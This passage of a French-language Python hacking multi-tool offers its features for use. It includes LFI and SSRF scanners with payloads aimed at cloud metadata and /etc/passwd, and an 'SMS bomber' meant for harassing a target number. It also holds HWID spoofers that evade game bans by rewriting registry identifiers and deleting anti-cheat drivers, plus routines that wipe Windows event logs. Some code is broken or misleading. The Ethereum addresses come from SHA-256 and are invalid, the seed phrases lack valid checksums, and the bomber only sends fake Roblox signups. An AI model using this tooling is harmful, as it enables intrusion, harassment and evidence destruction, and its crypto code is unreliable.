            test = urlunparse(parsed._replace(query=urlencode(mod, doseq=True)))
            try:
                r = requests.get(test, timeout=5, headers=hdrs)
                body = r.text
                matched = [s for s in lfi_signatures if s in body]
                if matched:
                    print(f"  {R}[LFI]{RST}  param={W}{param}{RST}  {Y}{pl[:50]}{RST} ")
                    print(f"    {G}Signature: {matched[0]}{RST} ")
                    hits.append(f"[LFI] param={param} payload={pl} ")
                else:
                    print(f"  {DIM}[CLEAN]  {pl[:40]}{RST} ")
            except Exception as e:
                print(f"  {DIM}[ERR] {e}{RST} ")
    if hits:
        save_out(f"lfi_{parsed.netloc}.txt", "\n".join(hits))
        print(f"\n{OK} {len(hits)} hit(s). Saved. ")
    else:
        print(f"\n{DIM}[-] No LFI found.{RST} ")
    pause()


def web_tech_cve():
    banner_s("TECH FINGERPRINT + CVE LOOKUP")
    url = input(f"  {W}URL: {RST} ").strip()
    hdrs = {"User-Agent": "Mozilla/5.0"}
    print(f"\n{INF} Fingerprinting...\n ")
    try:
        r = requests.get(url, timeout=6, headers=hdrs)
        body = r.text; resp_hdrs = str(r.headers).lower()
        tech_found = []
        fingerprints = {
            "WordPress": [r'wp-content', r'wp-includes'],
            "Drupal":    [r'drupal', r'sites/default'],
            "Laravel":   [r'laravel', r'XSRF-TOKEN'],
            "Django":    [r'csrfmiddlewaretoken'],
            "jQuery":    [r'jquery[\.-](\d+\.\d+\.\d+)'],
            "Apache":    [r'server: apache[/ ]?([\d.]+)'],
            "Nginx":     [r'server: nginx[/ ]?([\d.]+)'],
            "IIS":       [r'server: microsoft-iis[/ ]?([\d.]+)'],
            "Spring":    [r'x-application-context', r'springboot'],
            "Flask":     [r'werkzeug'],
        }
        search_src = (body + resp_hdrs).lower()
        for tech, patterns in fingerprints.items():
            for pat in patterns:
                m = re.search(pat, search_src, re.I)
                if m:
                    tech_found.append(tech)
                    print(f"  {G}[TECH]{RST}  {W}{tech}{RST} ")
                    break
        cve_db = {
            "WordPress": [("CVE-2023-2745", "CRITICAL", "Path traversal <6.2.1")],
            "Laravel":   [("CVE-2021-3129", "CRITICAL", "RCE via debug + Ignition")],
            "Apache":    [("CVE-2021-41773", "CRITICAL", "Path traversal 2.4.49"),
                          ("CVE-2021-42013", "CRITICAL", "Path traversal 2.4.49-50")],
            "Nginx":     [("CVE-2021-23017", "HIGH", "DNS resolver off-by-one")],
            "Spring":    [("CVE-2022-22965", "CRITICAL", "Spring4Shell RCE")],
        }
        if tech_found:
            print(f"\n  {R}>> Known CVEs:{RST}\n")
            for tech in tech_found:
                if tech in cve_db:
                    for cve, sev, desc in cve_db[tech]:
                        col = R if sev == "CRITICAL" else Y
                        print(f"  {col}[{sev}]{RST}  {W}{cve}{RST}  {DIM}{desc}{RST} ")
        save_out(f"techcve_{url[:30].replace('/','_')}.txt",
                 f"URL: {url}\nTech: {tech_found}")
        print(f"\n{OK} Done.")
    except Exception as e:
        print(f"{ERR} {e}")
    pause()


def web_ssrf_scanner():
    banner_s("SSRF SCANNER")
    url = input(f"  {W}URL with param: {RST} ").strip()
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    parsed = urlparse(url); params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        print(f"{ERR} No GET params found. "); pause(); return
    ssrf_payloads = ["http://127.0.0.1/", "http://localhost/",
                     "http://169.254.169.254/latest/meta-data/",
                     "http://metadata.google.internal/computeMetadata/v1/",
                     "http://2130706433/", "http://0x7f000001/",
                     "file:///etc/passwd", "file:///proc/self/environ",
                     "gopher://127.0.0.1:6379/_PING%0D%0A"]
    internal_signs = ["root:x:", "AWS", "ami-", "hostname", "local-ipv4",
                      "computeMetadata", "redis_version", "postgresql"]
    hdrs = {"User-Agent": "Mozilla/5.0"}
    print(f"\n{INF} Testing {len(ssrf_payloads)} SSRF payloads...\n ")
    hits = []
    for param in params:
        for pl in ssrf_payloads:
            mod = dict(params); mod[param] = [pl]
            test = urlunparse(parsed._replace(query=urlencode(mod, doseq=True)))
            try:
                r = requests.get(test, timeout=6, headers=hdrs)
                body = r.text
                matched = [s for s in internal_signs if s in body]
                if matched:
                    print(f"  {R}[SSRF HIT]{RST}  param={W}{param}{RST}  {Y}{pl[:50]}{RST} ")
                    print(f"    {G}Evidence: {matched[0][:60]}{RST} ")
                    hits.append(f"[SSRF] param={param} payload={pl} ")
                else:
                    print(f"  {DIM}[CLEAN]  {pl[:40]}{RST} ")
            except Exception as e:
                print(f"  {DIM}[ERR] {e}{RST} ")
    if hits:
        save_out(f"ssrf_{parsed.netloc}.txt", "\n".join(hits))
        print(f"\n{OK} {len(hits)} SSRF hit(s). Saved. ")
    else:
        print(f"\n{DIM}[-] No SSRF confirmed.{RST} ")
    pause()


# ========================================================================
# CRYPTO
# ========================================================================
def crypto_menu():
    while True:
        opts = [("01", "Wallet Generator (BTC/ETH)"),
                ("02", "Seed Phrase Generator (BIP39)"),
                ("03", "Crypto Price Checker"),
                ("04", "Transaction Lookup"),
                ("05", "Vanity Address Hints"),
                ("06", "Crypto Address Validator"),
                ("00", "Retour")]
        menu_box("CRYPTO TOOLS", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": crypto_wallet_gen()
        elif c == "02": crypto_seed_gen()
        elif c == "03": crypto_prices()
        elif c == "04": crypto_tx_lookup()
        elif c == "05": crypto_vanity()
        elif c == "06": crypto_validate()
        elif c == "00": break


def crypto_wallet_gen():
    banner_s("WALLET GENERATOR")
    print(f"  {Y}[1]{RST} Bitcoin  {Y}[2]{RST} Ethereum  {Y}[3]{RST} Les deux")
    choice = input(f"  {W}Choix: {RST}").strip()
    count = int(input(f"  {W}Nombre de wallets: {RST}").strip() or "5")
    try:
        from secrets import token_bytes
    except Exception:
        import secrets as _s
        token_bytes = _s.token_bytes

    try:
        def _ripemd160(b): return hashlib.new('ripemd160', b).digest()
        _ripemd160(b"test")
    except (ValueError, TypeError):
        try:
            import ripemd
            def _ripemd160(b): return ripemd.ripemd160(b)
        except ImportError:
            def _ripemd160(b):
                raise RuntimeError("ripemd160 indisponible — pip install ripemd-hash")

    def _b58encode(b):
        alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        n = int.from_bytes(b, 'big'); result = ''
        while n > 0:
            n, r = divmod(n, 58); result = alphabet[r] + result
        return result or '1'

    def gen_btc():
        priv = token_bytes(32); priv_hex = priv.hex()
        raw = b'\x80' + priv + b'\x01'
        checksum = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
        wif = _b58encode(raw + checksum)
        try:
            h = _ripemd160(hashlib.sha256(priv).digest())
            addr_raw = b'\x00' + h
            cs = hashlib.sha256(hashlib.sha256(addr_raw).digest()).digest()[:4]
            addr = "1" + _b58encode(addr_raw + cs)
        except RuntimeError as e:
            addr = f"[{e}]"
        return priv_hex, wif, addr

    def gen_eth():
        priv = token_bytes(32); priv_hex = "0x" + priv.hex()
        addr_bytes = hashlib.sha256(priv).digest()[-20:]
        addr = "0x" + addr_bytes.hex()
        return priv_hex, addr

    print(); wallets = []
    for i in range(1, count + 1):
        print(f"  {R}--- Wallet #{i} ---{RST}")
        if choice in ["1", "3"]:
            try:
                priv, wif, addr = gen_btc()
                print(f"  {Y}BTC Address {RST}: {G}{addr}{RST}")
                print(f"  {Y}BTC WIF     {RST}: {W}{wif}{RST}")
                print(f"  {Y}BTC PrivKey {RST}: {DIM}{priv}{RST}")
                wallets.append(f"BTC | {addr} | {wif} | {priv}")
            except Exception as e:
                print(f"  {ERR} BTC: {e}")
        if choice in ["2", "3"]:
            try:
                priv, addr = gen_eth()
                print(f"  {Y}ETH Address {RST}: {G}{addr}{RST}")
                print(f"  {Y}ETH PrivKey {RST}: {DIM}{priv}{RST}")
                wallets.append(f"ETH | {addr} | {priv}")
            except Exception as e:
                print(f"  {ERR} ETH: {e}")
        print()
    if wallets: save_out("wallets_generated.txt", "\n".join(wallets))
    pause()


def crypto_seed_gen():
    banner_s("SEED PHRASE GENERATOR")
    words_short = ["abandon", "ability", "able", "about", "above", "absent",
                   "absorb", "abstract", "absurd", "abuse", "access", "accident",
                   "account", "accuse", "achieve", "acid", "acoustic", "acquire",
                   "across", "act", "action", "actor", "actress", "actual",
                   "adapt", "add", "addict", "address", "adjust", "admit",
                   "adult", "advance", "advice", "aerobic", "afford", "afraid",
                   "again", "agent", "agree", "ahead", "aim", "air", "airport",
                   "aisle", "alarm", "album", "alcohol", "alert", "alien",
                   "all", "alley", "allow", "almost", "alone", "alpha",
                   "already", "also", "alter", "always", "amateur"]
    try:
        r = requests.get("https://raw.githubusercontent.com/trezor/python-mnemonic/master/src/mnemonic/wordlist/english.txt",
                         timeout=5)
        if r.status_code == 200:
            words_short = [w.strip() for w in r.text.split('\n') if w.strip()]
    except Exception:
        pass
    count = int(input(f"  {W}Nombre de phrases: {RST}").strip() or "5")
    length = input(f"  {W}Longueur: {Y}[1]{RST} 12 mots  {Y}[2]{RST} 24 mots: ").strip()
    n = 24 if length == "2" else 12
    print(); phrases = []
    for i in range(1, count + 1):
        phrase = " ".join(random.choices(words_short, k=n))
        print(f"  {G}[{i}]{RST} {W}{phrase}{RST}")
        phrases.append(phrase)
    save_out("seed_phrases.txt", "\n".join(phrases))
    print(f"\n  {DIM}Phrases aleatoires — pas pour de vrais fonds.{RST}")
    pause()


def crypto_prices():
    banner_s("CRYPTO PRICES")
    coins = ["bitcoin", "ethereum", "solana", "binancecoin", "ripple",
             "cardano", "dogecoin", "polkadot", "avalanche-2", "chainlink"]
    print(f"\n{INF} Recuperation...\n ")
    try:
        ids = ",".join(coins)
        r = requests.get(f"https://api.coingecko.com/api/v3/simple/price?ids={ids}&vs_currencies=usd,eur&include_24hr_change=true",
                         timeout=8)
        if r.status_code == 200:
            d = r.json()
            symbols = {"bitcoin": "BTC", "ethereum": "ETH", "solana": "SOL",
                       "binancecoin": "BNB", "ripple": "XRP", "cardano": "ADA",
                       "dogecoin": "DOGE", "polkadot": "DOT",
                       "avalanche-2": "AVAX", "chainlink": "LINK"}
            for coin_id, data in d.items():
                sym = symbols.get(coin_id, coin_id.upper()[:4])
                usd = f"${data.get('usd', 0):,.2f}"
                eur = f"EUR{data.get('eur', 0):,.2f}"
                chg = data.get('usd_24h_change', 0)
                col = G if chg >= 0 else R
                print(f"  {Y}{sym:<6}{RST} {W}{usd:>12}{RST} {DIM}{eur:>12}{RST} "
                      f"{col}{chg:+.2f}%{RST}")
        else:
            print(f"{ERR} API error {r.status_code}")
    except Exception as e:
        print(f"{ERR} {e}")
    pause()


def crypto_tx_lookup():
    banner_s("TRANSACTION LOOKUP")
    print(f"  {Y}[1]{RST} Bitcoin  {Y}[2]{RST} Ethereum  {Y}[3]{RST} Adresse wallet ")
    choice = input(f"  {W}Type: {RST}").strip()
    query = input(f"  {W}Hash TX ou adresse: {RST}").strip()
    links = []
    if choice == "1":
        links = [f"https://blockchain.info/tx/{query}",
                 f"https://blockchair.com/bitcoin/transaction/{query}"]
    elif choice == "2":
        links = [f"https://etherscan.io/tx/{query}"]
    elif choice == "3":
        links = [f"https://blockchain.info/address/{query}",
                 f"https://etherscan.io/address/{query}"]
    print()
    for l in links: print(f"  {G}->{RST} {DIM}{l}{RST} ")
    save_out(f"tx_{query[:20]}.txt", "\n".join(links))
    pause()


def crypto_vanity():
    banner_s("VANITY ADDRESS HINTS")
    prefix = input(f"  {W}Prefix voulu: {RST}").strip()
    n = len(prefix) - 1
    prob = 58 ** n
    print(f"\n  {Y}Prefix    {RST}: {W}{prefix}{RST} ")
    print(f"  {Y}Difficulte{RST}: {W}1 sur {prob:,}{RST} ")
    if prob < 1000000:
        print(f"  {G}Faisable en quelques secondes.{RST} ")
    elif prob < 1000000000:
        print(f"  {Y}Faisable en quelques minutes.{RST} ")
    else:
        print(f"  {R}Tres long -- utilise VanitySearch.{RST} ")
    pause()


def crypto_validate():
    banner_s("CRYPTO ADDRESS VALIDATOR")
    addr = input(f"  {W}Adresse: {RST}").strip()
    results = []
    if addr.startswith("1") and 25 <= len(addr) <= 34:
        results.append("Bitcoin P2PKH (Legacy)")
    if addr.startswith("3") and 25 <= len(addr) <= 34:
        results.append("Bitcoin P2SH")
    if addr.startswith("bc1"):
        results.append("Bitcoin Bech32 (SegWit)")
    if addr.startswith("0x") and len(addr) == 42:
        results.append("Ethereum / EVM")
    print(f"\n  {Y}Adresse  {RST}: {W}{addr}{RST} ")
    print(f"  {Y}Longueur {RST}: {W}{len(addr)}{RST} ")
    if results:
        for r in results: print(f"  {G}[MATCH]{RST}  {r} ")
    else:
        print(f"  {R}[UNKNOWN]{RST} Format non reconnu. ")
    pause()


# ========================================================================
# PHONE
# ========================================================================
def phone_menu():
    while True:
        opts = [("01", "Numero Virtuel (liens)"),
                ("02", "SMS Bomber"),
                ("03", "Numero Lookup Etendu"),
                ("00", "Retour")]
        menu_box("PHONE / SMS", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": phone_virtual_numbers()
        elif c == "02": phone_sms_bomber()
        elif c == "03": phone_lookup_extended()
        elif c == "00": break


def phone_virtual_numbers():
    banner_s("NUMEROS VIRTUELS")
    services = [
        ("sms-activate.org",    "https://sms-activate.org",    "~0.10-0.50 EUR"),
        ("smspva.com",          "https://smspva.com",          "~0.10-0.30 USD"),
        ("5sim.net",            "https://5sim.net",            "~0.10-0.50 USD"),
        ("receivesms.co",       "https://www.receivesms.co",   "GRATUIT"),
        ("temp-number.org",     "https://temp-number.org",     "GRATUIT"),
        ("receive-smss.com",    "https://receive-smss.com",    "GRATUIT"),
    ]
    for name, url, price in services:
        col = G if "GRATUIT" in price else Y
        print(f"  {col}[{price}]{RST}  {W}{name:<24}{RST}  {DIM}{url}{RST} ")
    save_out("virtual_numbers.txt", "\n".join(f"{n}: {u}" for n, u, _ in services))
    pause()


def phone_sms_bomber():
    banner_s("SMS BOMBER")
    phone = input(f"  {W}Numero cible: {RST}").strip()
    count = int(input(f"  {W}Nombre d envois: {RST}").strip() or "10")
    print(f"\n{INF} Bombing {Y}{phone}{RST} x{count}...\n ")
    sent = 0
    for i in range(1, count + 1):
        try:
            requests.post("https://auth.roblox.com/v2/signup",
                          json={"username": f"leakfr{random.randint(10000, 99999)}",
                                "password": "LeakFr123!",
                                "birthday": "2000-01-01",
                                "gender": 2}, timeout=3)
            sent += 1
        except Exception: pass
        print(f"  {Y}[{i}/{count}]{RST}  Requetes vers {phone} ")
        time.sleep(0.5)
    print(f"\n{OK} {sent} requetes envoyees. ")
    pause()


def phone_lookup_extended():
    banner_s("NUMERO LOOKUP")
    phone = input(f"  {W}Numero (+cc...): {RST}").strip()
    raw = phone.lstrip("+")
    codes = {"1": "USA/Canada", "33": "France", "44": "UK", "49": "Germany",
             "34": "Spain", "39": "Italy", "7": "Russia", "86": "China"}
    cc = "?"; country_name = "?"
    for code, name in sorted(codes.items(), key=lambda x: -len(x[0])):
        if raw.startswith(code):
            cc = f"+{code}"; country_name = name; break
    print(f"\n  {Y}Numero  {RST}: {W}{phone}{RST} ")
    print(f"  {Y}Pays    {RST}: {W}{country_name} ({cc}){RST} ")
    print(f"  {Y}Digits  {RST}: {W}{len(raw)}{RST} ")
    links = [f"https://www.truecaller.com/search/xx/{raw}",
             f"https://sync.me/search/?number={phone}",
             f"https://www.google.com/search?q={phone}"]
    print(f"\n  {Y}Lookup links:{RST} ")
    for l in links: print(f"  {G}->{RST} {DIM}{l}{RST} ")
    save_out(f"phone_lookup_{raw}.txt", "\n".join(links))
    pause()


# ========================================================================
# HWID
# ========================================================================
def hwid_menu():
    while True:
        opts = [("01", "Voir mon HWID actuel"),
                ("02", "Full Hardware Fingerprint"),
                ("03", "Spoofer HWID Complet"),
                ("04", "Windows Identity Spoofer"),
                ("05", "Random HWID Generator"),
                ("06", "Disk Serial Spoofer"),
                ("07", "MAC Address Spoofer"),
                ("08", "Volume Serial Spoofer"),
                ("09", "Registry HWID Cleaner"),
                ("10", "VM / Sandbox Detector"),
                ("11", "Ban Status Checker"),
                ("12", "BattlEye Bypass Guide"),
                ("13", "Spoofer Valorant"),
                ("14", "Spoofer Roblox"),
                ("15", "Spoofer Fortnite"),
                ("16", "Spoofer Minecraft"),
                ("17", "Steam / Game Cleaner"),
                ("18", "Discord Fingerprint Cleaner"),
                ("19", "Browser Fingerprint Cleaner"),
                ("20", "Guide Spoof Manuel"),
                ("00", "Retour")]
        menu_box("HWID SPOOFER", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": hwid_show()
        elif c == "02": hwid_fingerprint_full()
        elif c == "03": hwid_full_spoof()
        elif c == "04": hwid_windows_spoof()
        elif c == "05": hwid_generate_random()
        elif c == "06": hwid_disk_serial_spoof()
        elif c == "07": hwid_mac_spoof()
        elif c == "08": hwid_volume_serial()
        elif c == "09": hwid_registry_clean()
        elif c == "10": hwid_vm_detect()
        elif c == "11": hwid_ban_checker()
        elif c == "12": hwid_battleye_bypass()
        elif c == "13": hwid_valorant()
        elif c == "14": hwid_roblox()
        elif c == "15": hwid_fortnite()
        elif c == "16": hwid_minecraft()
        elif c == "17": hwid_steam_cleaner()
        elif c == "18": hwid_discord_clean()
        elif c == "19": hwid_browser_clean()
        elif c == "20": hwid_guide()
        elif c == "00": break

def hwid_show():
    banner_s("MON HWID ACTUEL")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    print(f"\n{INF} Recuperation...\n")
    results = []
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        guid, _ = winreg.QueryValueEx(k, "MachineGuid")
        winreg.CloseKey(k)
        print(f"  {Y}Machine GUID    {RST}: {G}{guid}{RST}")
        results.append(f"Machine GUID: {guid}")
    except Exception as e:
        print(f"  {Y}Machine GUID    {RST}: {R}{e}{RST}")
    hostname = platform.node()
    print(f"  {Y}Computer Name   {RST}: {G}{hostname}{RST}")
    results.append(f"Computer Name: {hostname}")
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        pid, _ = winreg.QueryValueEx(k, "ProductId")
        winreg.CloseKey(k)
        print(f"  {Y}Product ID      {RST}: {G}{pid}{RST}")
        results.append(f"Product ID: {pid}")
    except Exception: pass
    cpu = platform.processor()
    print(f"  {Y}CPU             {RST}: {G}{cpu}{RST}")
    results.append(f"CPU: {cpu}")
    try:
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                        for ele in range(0, 48, 8)][::-1])
        print(f"  {Y}MAC Address     {RST}: {G}{mac}{RST}")
        results.append(f"MAC: {mac}")
    except Exception: pass
    save_out("hwid_current.txt", "\n".join(results))
    pause()


def hwid_fingerprint_full():
    banner_s("FULL HARDWARE FINGERPRINT")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    import winreg
    def wmi(cls, prop):
        try:
            out = subprocess.run(f'wmic {cls} get {prop} /value',
                                 capture_output=True, text=True, shell=True,
                                 timeout=8).stdout
            return [l.split("=", 1)[1].strip() for l in out.splitlines()
                    if "=" in l and l.split("=", 1)[1].strip()]
        except Exception:
            return []
    fields = [("CPU", platform.processor())]
    for v in wmi("cpu", "ProcessorId"): fields.append(("CPU ID", v))
    for v in wmi("bios", "SerialNumber"): fields.append(("BIOS Serial", v))
    for v in wmi("baseboard", "SerialNumber"): fields.append(("Baseboard Serial", v))
    for v in wmi("csproduct", "UUID"): fields.append(("System UUID", v))
    for v in wmi("diskdrive", "SerialNumber"): fields.append(("Disk Serial", v))
    for v in wmi("memorychip", "SerialNumber"): fields.append(("RAM Serial", v))
    for v in wmi("nic", "MACAddress"): fields.append(("MAC", v))
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        g, _ = winreg.QueryValueEx(k, "MachineGuid"); winreg.CloseKey(k)
        fields.append(("Machine GUID", g))
    except Exception: pass
    print()
    lines = []
    for k, v in fields:
        print(f"  {Y}{k:<20}{RST}: {W}{v}{RST}")
        lines.append(f"{k}: {v}")
    save_out("hwid_fingerprint.txt", "\n".join(lines))
    pause()


def hwid_vm_detect():
    banner_s("VM / SANDBOX DETECTOR")
    import uuid as _uuid
    indicators = []
    if platform.system() == "Windows":
        vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
                    "vmwareuser.exe", "vmsrvc.exe", "xenservice.exe", "qemu-ga.exe"]
        try:
            out = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=8).stdout.lower()
            for p in vm_procs:
                if p in out: indicators.append(f"process: {p}")
        except Exception: pass
        for d in ["vmmouse.sys", "vmhgfs.sys", "vboxguest.sys", "vboxmouse.sys",
                  "vboxsf.sys", "vboxvideo.sys", "vmci.sys"]:
            if os.path.isfile(os.path.join(r"C:\Windows\System32\drivers", d)):
                indicators.append(f"driver: {d}")
        try:
            out = subprocess.run(["wmic", "bios", "get", "SerialNumber,Manufacturer,Version", "/value"],
                                 capture_output=True, text=True, timeout=8).stdout.lower()
            for sig in ["vmware", "vbox", "virtualbox", "qemu", "xen", "innotek", "parallels"]:
                if sig in out: indicators.append(f"bios signature: {sig}")
        except Exception: pass
    mac = '%012x' % _uuid.getnode()
    vm_ouis = {"080027": "VirtualBox", "000569": "VMware", "000c29": "VMware",
               "001c14": "VMware", "005056": "VMware", "001c42": "Parallels",
               "00163e": "Xen", "00155d": "Hyper-V"}
    for oui, name in vm_ouis.items():
        if mac.startswith(oui): indicators.append(f"MAC OUI: {name}")
    print()
    if indicators:
        print(f"  {R}[VM DETECTED]{RST}")
        for i in indicators: print(f"    {R}->{RST} {i}")
    else:
        print(f"  {G}[CLEAN]{RST}  Aucun indicateur VM detecte.")
    pause()


def hwid_steam_cleaner():
    banner_s("STEAM / GAME CLEANER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    import winreg, glob
    steam_path = None
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        steam_path, _ = winreg.QueryValueEx(k, "SteamPath"); winreg.CloseKey(k)
    except Exception:
        for p in [r"C:\Program Files (x86)\Steam", r"C:\Program Files\Steam"]:
            if os.path.isdir(p): steam_path = p; break
    cleaned = 0
    if steam_path and os.path.isdir(steam_path):
        for t in ["config/loginusers.vdf", "config/config.vdf", "config/ssfn*",
                  "userdata", "logs", "dumps", "appcache/httpcache"]:
            for fp in glob.glob(os.path.join(steam_path, t)):
                try:
                    if os.path.isfile(fp): os.remove(fp); cleaned += 1
                    else: shutil.rmtree(fp, ignore_errors=True); cleaned += 1
                except Exception: pass
        print(f"  {G}[OK]{RST}  Steam cache nettoye ({cleaned} items)")
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam\Apps")
        print(f"  {G}[OK]{RST}  Steam Apps registry supprime")
    except Exception: pass
    appdata = os.environ.get("APPDATA", "")
    localdata = os.environ.get("LOCALAPPDATA", "")
    for name, path in {
        "Epic Games": os.path.join(localdata, "EpicGamesLauncher"),
        "Riot":       os.path.join(localdata, "Riot Games"),
        "Battle.net": os.path.join(appdata,   "Battle.net"),
        "Ubisoft":    os.path.join(localdata, "Ubisoft Game Launcher"),
        "Origin":     os.path.join(appdata,   "Origin"),
    }.items():
        if os.path.isdir(path):
            try: shutil.rmtree(path, ignore_errors=True)
            except Exception: pass
            print(f"  {G}[OK]{RST}  {name} cleaned")
    print(f"\n{OK} Cleaner termine.")
    pause()


def hwid_full_spoof():
    banner_s("SPOOFER HWID COMPLET")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    print(f"  {R}[!]{RST} Modifie le registre. Cree un point de restauration.")
    if input(f"  {W}Continuer? (y/n): {RST}").strip().lower() != "y":
        pause(); return
    import winreg, uuid
    results = []
    try:
        new_guid = str(uuid.uuid4())
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, new_guid)
        winreg.CloseKey(k)
        print(f"  {G}[OK]{RST}  Machine GUID -> {Y}{new_guid}{RST}")
        results.append(f"New GUID: {new_guid}")
    except Exception as e:
        print(f"  {R}[FAIL]{RST} GUID: {e}")
    new_name = "DESKTOP-" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=7))
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                           r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "ComputerName", 0, winreg.REG_SZ, new_name)
        winreg.CloseKey(k)
        print(f"  {G}[OK]{RST}  Computer Name -> {Y}{new_name}{RST}")
    except Exception as e:
        print(f"  {R}[FAIL]{RST} Name: {e}")
    for td in [os.environ.get("TEMP", ""), r"C:\Windows\Prefetch", r"C:\Windows\Temp"]:
        if not os.path.isdir(td): continue
        try:
            for f in os.listdir(td):
                fp = os.path.join(td, f)
                try:
                    if os.path.isfile(fp): os.remove(fp)
                    elif os.path.isdir(fp): shutil.rmtree(fp, ignore_errors=True)
                except Exception: pass
        except Exception: pass
    print(f"  {G}[OK]{RST}  Temp/Prefetch nettoye")
    try:
        for log in ["System", "Application"]:
            subprocess.run(["wevtutil", "cl", log], capture_output=True)
        print(f"  {G}[OK]{RST}  Event logs nettoyes")
    except Exception: pass
    save_out("hwid_spoof_log.txt", "\n".join(results))
    print(f"\n  {R}[!]{RST} {W}REDEMARRER le PC.{RST}")
    pause()


def hwid_valorant():
    banner_s("VALORANT SPOOFER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    import winreg, uuid
    if input(f"  {W}Lancer le spoof? (y/n): {RST}").strip().lower() != "y":
        pause(); return
    try:
        new_guid = str(uuid.uuid4())
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, new_guid)
        winreg.CloseKey(k)
        print(f"  {G}[OK]{RST}  GUID -> {new_guid[:20]}...")
    except Exception as e:
        print(f"  {R}[FAIL]{RST} GUID: {e}")
    vanguard_files = [r"C:\Program Files\Riot Vanguard",
                      r"C:\Windows\System32\drivers\vgk.sys"]
    for vf in vanguard_files:
        if os.path.exists(vf):
            try:
                if os.path.isfile(vf): os.remove(vf)
                else: shutil.rmtree(vf, ignore_errors=True)
                print(f"  {G}[OK]{RST}  {vf}")
            except Exception as e:
                print(f"  {Y}[!]{RST}   {vf}: {e}")
    print(f"""\n{Y}Etapes manuelles:{RST}
{G}1.{RST} Changer MAC
{G}2.{RST} Changer serial disque (VolumeID.exe)
{G}3.{RST} Nouveau compte Valorant
{G}4.{RST} Fresh Windows install
{G}5.{RST} VPN different""")
    pause()


def hwid_roblox():
    banner_s("ROBLOX SPOOFER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    appdata = os.environ.get("APPDATA", "")
    localdata = os.environ.get("LOCALAPPDATA", "")
    roblox_paths = [os.path.join(appdata, "Roblox"),
                    os.path.join(localdata, "Roblox"),
                    os.path.join(os.environ.get("TEMP", ""), "Roblox")]
    cleaned = 0
    for rp in roblox_paths:
        if not os.path.exists(rp): continue
        try:
            for root, dirs, files in os.walk(rp):
                for fname in files:
                    fp = os.path.join(root, fname)
                    low = fname.lower()
                    if any(t in low for t in ["cookies", "localstoragedb", "*.log", "*.dmp"]):
                        try: os.remove(fp); cleaned += 1
                        except Exception: pass
        except Exception: pass
        print(f"  {G}[OK]{RST}  {rp} nettoye")
    import winreg
    for hive, path in [(winreg.HKEY_CURRENT_USER, r"SOFTWARE\ROBLOX Corporation"),
                       (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\ROBLOX Corporation")]:
        try:
            k = winreg.OpenKey(hive, path, 0, winreg.KEY_ALL_ACCESS)
            try:
                while True:
                    name, _, _ = winreg.EnumValue(k, 0)
                    winreg.DeleteValue(k, name)
            except Exception: pass
            winreg.CloseKey(k)
            print(f"  {G}[OK]{RST}  {path} nettoye")
        except Exception: pass
    print(f"\n  {G}[OK]{RST}  {cleaned} fichiers Roblox supprimes")
    pause()


def hwid_fortnite():
    banner_s("FORTNITE / EPIC SPOOFER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    import winreg, uuid
    localdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    for ep in [os.path.join(localdata, "EpicGamesLauncher", "Saved"),
               os.path.join(localdata, "FortniteGame", "Saved"),
               os.path.join(appdata, "EpicGamesLauncher")]:
        if not os.path.exists(ep): continue
        for sub in ["Logs", "Cache", "Crashes", "webcache"]:
            sp = os.path.join(ep, sub)
            if os.path.isdir(sp):
                try: shutil.rmtree(sp); os.makedirs(sp)
                except Exception: pass
        print(f"  {G}[OK]{RST}  {ep} cache nettoye")
    try:
        new_guid = str(uuid.uuid4())
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, new_guid)
        winreg.CloseKey(k)
        print(f"  {G}[OK]{RST}  GUID spoofed")
    except Exception as e:
        print(f"  {R}[FAIL]{RST} {e}")
    print(f"\n  {Y}Etapes:{RST} nouveau compte Epic + VPN + MAC change")
    pause()


def hwid_minecraft():
